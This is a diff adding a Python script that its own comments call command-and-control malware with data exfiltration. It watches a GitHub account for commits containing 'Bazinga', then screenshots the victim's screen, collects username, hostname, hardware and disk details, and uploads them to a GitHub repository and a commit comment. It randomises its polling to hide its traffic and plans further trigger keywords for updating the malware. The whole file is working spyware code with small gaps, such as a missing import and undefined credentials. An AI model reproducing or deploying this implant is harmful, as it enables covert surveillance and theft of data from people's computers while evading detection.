@@ -1,0 +1,245 @@
+This is my Bazinga trigger!
+import requests
+import json
+from datetime import datetime
+import platform
+import getpass
+import psutil
+import time
+import random
+import pyautogui
+import base64
+import io
+from typing import Optional, Tuple
+
+# GitHub congfug
+
+class GitHubCommitMonitor:
+    def __init__(self):
+        """
+        Initialise the GitHub commit monitor with hardcoded credentials.
+        """
+        self.username = GITHUB_USERNAME
+        self.base_url = "https://api.github.com"
+        self.headers = {
+            "Accept": "application/vnd.github.v3+json",
+            "Authorization": f"token {GITHUB_TOKEN}"
+        }
+        self.last_processed_commit = None
+        print("Initialising with rock-solid, totally-not-exposed credentials...")
+        
+    def create_screenshot_and_info(self) -> Tuple[str, str, str]:
+        """
+        Take a screenshot and create a system info file.
+        Yes, we are actually taking a screenshot for a Git commit. Why? Because we can.
+        Also thats like the whole point of this, C2 with data exfiltration 
+        Returns the timestamp, base64 encoded raw screenshot data, and system info.
+        """
+        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
+        
+        # Take screenshot and convert to base64
+        screenshot = pyautogui.screenshot()
+        screenshot_buffer = io.BytesIO()
+        screenshot.save(screenshot_buffer, format='PNG')
+        screenshot_raw = base64.b64encode(screenshot_buffer.getvalue()).decode('utf-8')
+            
+        # Generate system info
+        system_info = self.get_detailed_system_info()
+            
+        return timestamp, screenshot_raw, system_info
+
+    def get_detailed_system_info(self) -> str:
+        """
+        Gather detailed system information for the info file
+        Because we obviously need to know the free disk space to load up more bloatware lol
+        """
+        info = [
+            "=== System Information ===",
+            f"Timestamp: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}",
+            f"OS: {platform.system()} {platform.release()} {platform.version()}",
+            f"Machine: {platform.machine()}",
+            f"Processor: {platform.processor()}",
+            f"Username: {getpass.getuser()}",
+            f"Hostname: {platform.node()}",
+            f"Python Version: {platform.python_version()}",
+            "\n=== Hardware Information ===",
+            f"CPU Cores: {psutil.cpu_count()}",
+            f"CPU Physical Cores: {psutil.cpu_count(logical=False)}",
+            f"CPU Usage: {psutil.cpu_percent()}%",
+            f"Total RAM: {round(psutil.virtual_memory().total / (1024.0 ** 3), 2)} GB",
+            f"Available RAM: {round(psutil.virtual_memory().available / (1024.0 ** 3), 2)} GB",
+            f"RAM Usage: {psutil.virtual_memory().percent}%",
+            "\n=== Disk Information ==="
+        ]
+        
+        # Add disk information
+        for partition in psutil.disk_partitions():
+            try:
+                usage = psutil.disk_usage(partition.mountpoint)
+                info.extend([
+                    f"\nDrive {partition.device}:",
+                    f"  Mount Point: {partition.mountpoint}",
+                    f"  File System: {partition.fstype}",
+                    f"  Total Size: {round(usage.total / (1024.0 ** 3), 2)} GB",
+                    f"  Used: {round(usage.used / (1024.0 ** 3), 2)} GB",
+                    f"  Free: {round(usage.free / (1024.0 ** 3), 2)} GB",
+                    f"  Usage: {usage.percent}%"
+                ])
+            except:
+                continue
+
+        return "\n".join(info)
+
+    def upload_to_github(self, filename: str, content: str) -> str:
+        """
+        Upload a txt file to GitHub repository and return its URL 
+        we want this random data publicly accessible. 
+        """
+        url = f"{self.base_url}/repos/{self.username}/{IMAGE_REPO}/contents/snapshots/{filename}"
+        
+        data = {
+            "message": f"Add system snapshot {filename}",
+            "content": base64.b64encode(content.encode('utf-8')).decode('utf-8')
+        }
+        
+        response = requests.put(url, headers=self.headers, json=data)
+        if response.status_code not in [201, 200]:
+            raise Exception(f"Failed to upload file: {response.status_code} - {response.text}")
+            
+        return response.json()['content']['html_url']
+
+    
+    
+    
+    def comment_on_commit(self, repo_name: str, commit_sha: str, message: str):
+        """
+        Add a comment to a specific commit. Here we are just trying to show that comments are another method for exfiltration
+        """
+        url = f"{self.base_url}/repos/{self.username}/{repo_name}/commits/{commit_sha}/comments"
+        data = {"body": message}
+        
+        response = requests.post(url, headers=self.headers, json=data)
+        if response.status_code != 201:
+            raise Exception(f"Failed to post comment: {response.status_code} - {response.text}")
+        return response.json()
+
+    def get_repos(self) -> list:
+        """Get all public repositories for the user."""
+        url = f"{self.base_url}/users/{self.username}/repos"
+        response = requests.get(url, headers=self.headers)
+        if response.status_code == 200:
+            return response.json()
+        else:
+            raise Exception(f"Failed to fetch repositories: {response.status_code}")
+
+    def get_commits_with_keyword(self, repo_name: str, keyword: str) -> list:
+        """
+        Get all commits containing the specified keyword in their message. 
+        This will allow us in future to add more keywords to preform more actions, e.g update the malware
+        """
+        url = f"{self.base_url}/repos/{self.username}/{repo_name}/commits"
+        commits_with_keyword = []
+        
+        try:
+            response = requests.get(url, headers=self.headers)
+            if response.status_code == 200:
+                commits = response.json()
+                for commit in commits:
+                    if keyword.lower() in commit['commit']['message'].lower():
+                        commits_with_keyword.append({
+                            'message': commit['commit']['message'],
+                            'sha': commit['sha'],
+                            'date': commit['commit']['author']['date'],
+                            'repo': repo_name
+                        })
+            return commits_with_keyword
+        except Exception as e:
+            print(f"Error fetching commits for {repo_name}: {str(e)}")
+            return []
+
+    def process_latest_bazinga_commit(self):
+        """
+        Find and process the latest commit containing 'Bazinga'. Idk why I chose this
+        """
+        all_matching_commits = []
+        repos = self.get_repos()
+        
+        for repo in repos:
+            commits = self.get_commits_with_keyword(repo['name'], 'Bazinga')
+            all_matching_commits.extend(commits)
+        
+        if all_matching_commits:
+            latest_commit = max(all_matching_commits, 
+                              key=lambda x: datetime.strptime(x['date'], "%Y-%m-%dT%H:%M:%SZ"))
+            
+            if (self.last_processed_commit is None or 
+                latest_commit['sha'] != self.last_processed_commit['sha']):
+                
+                print(f"Found new 'Bazinga' commit:")
+                print(f"Repository: {latest_commit['repo']}")
+                print(f"Message: {latest_commit['message']}")
+                print(f"Date: {latest_commit['date']}")
+                
+                self.perform_actions(latest_commit)
+                self.last_processed_commit = latest_commit
+                return True
+            
+        return False
+
+    def perform_actions(self, commit: dict):
+        """
+        Perform actions based on the commit message.
+        """
+        try:
+            # Create screenshot and system info
+            timestamp, screenshot_raw, system_info = self.create_screenshot_and_info()
+            
+            # Upload files to GitHub
+            data_url = self.upload_to_github(
+                f"data_{timestamp}.txt", 
+                f"Screenshot Base64:\n{screenshot_raw}\n\nSystem Info:\n{system_info}"
+            )
+            
+            # Create comment message
+            comment = f"""🖥️ System Snapshot Created
+
+📊 Raw Data (Base64 + System Info): [View]({data_url})
+
+Timestamp: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
+"""
+            
+            # Post comment on the commit
+            self.comment_on_commit(commit['repo'], commit['sha'], comment)
+            print(f"Successfully posted system snapshot on commit {commit['sha']}")
+            
+            # Log to file
+            with open('bazinga_commits.log', 'a') as f:
+                f.write(f"\n{datetime.now()}: New Bazinga commit in {commit['repo']}: {commit['message']}")
+                f.write(f"\nData URL: {data_url}\n")
+                
+        except Exception as e:
+            print(f"Failed to process commit: {str(e)}")
+            traceback.print_exc()
+
+def main():
+    monitor = GitHubCommitMonitor()
+    print("Starting continuous monitoring for 'Bazinga' commits...")
+    
+    while True:
+        """Making the traffic more random so not as obvious ;)"""
+        try:
+            monitor.process_latest_bazinga_commit()
+            sleep_time = random.uniform(60, 300)
+            print(f"\nSleeping for {sleep_time:.1f} seconds...")
+            time.sleep(sleep_time)
+            
+            
+            
+            
+        except Exception as e:
+            print(f"Error in main loop: {str(e)}")
+            traceback.print_exc()
+            time.sleep(60)
+
+if __name__ == "__main__":
+    main()
